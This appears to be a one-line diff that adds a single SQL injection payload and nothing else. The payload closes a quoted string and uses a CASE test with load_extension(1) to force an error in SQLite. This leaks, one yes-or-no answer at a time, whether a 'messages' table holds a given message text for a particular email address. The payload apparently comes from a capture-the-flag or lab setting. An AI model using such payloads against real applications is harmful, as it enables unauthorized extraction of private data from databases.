@@ -1,0 +1,1 @@
+' and case when (select 1 FROM messages WHERE message LIKE '%mona lisa%' and email LIKE 'emily@forgotten-gallery.net%') then 1 else load_extension(1) end) --
